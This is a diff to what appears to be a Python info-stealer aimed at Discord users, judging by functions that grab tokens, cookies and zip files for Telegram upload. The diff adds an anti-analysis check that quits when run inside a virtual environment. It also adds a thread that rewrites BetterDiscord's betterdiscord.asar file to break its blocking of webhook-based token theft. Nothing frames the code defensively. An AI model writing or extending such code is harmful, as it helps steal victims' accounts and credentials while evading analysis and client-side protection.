@@ -49,7 +49,17 @@ import requests
 def sql_connect(database_path):
     conn = sqlite3.connect(database_path)
     return conn
-    
+
+
+def get_base_prefix_compat():
+    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
+
+def in_virtualenv(): 
+    return get_base_prefix_compat() != sys.prefix
+
+if in_virtualenv() == True:
+    sys.exit() 
+
 def clear_command_prompt():
     if os.name == 'nt':
         os.system('cls')
@@ -1780,6 +1790,19 @@ def uploadwa():
     except:
         pass
     
+def bypass_bd():
+    try:
+        bd_path = os.path.join(os.getenv("appdata"), "BetterDiscord", "data", "betterdiscord.asar")
+
+        with open(bd_path, "r", encoding="cp437") as f:
+            content = f.read().replace("api/webhook", "Err: 444")
+
+        with open(bd_path, "w", encoding="cp437") as f:
+            f.write(content)
+    except: 
+        pass
+
+
 def ZipTelegram(path, arg, procc):
     try:
         global OtherZip
@@ -2556,7 +2579,6 @@ def cokssite():
                             parts = line.split()
                             second = parts[2]
                     if first != '' and  second != '':
-                        print('test')
                         first, second = '',''
                 except:
                     pass
@@ -2762,7 +2784,10 @@ def gatha():
         tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
         tokq.start()
         aa.append(tokq)
-
+    bd = threading.Thread(target=bypass_bd)
+    bd.start()
+    aa.append(bd)
+    
     getinf = threading.Thread(target=getinfo)
     getinf.start()
     aa.append(getinf)
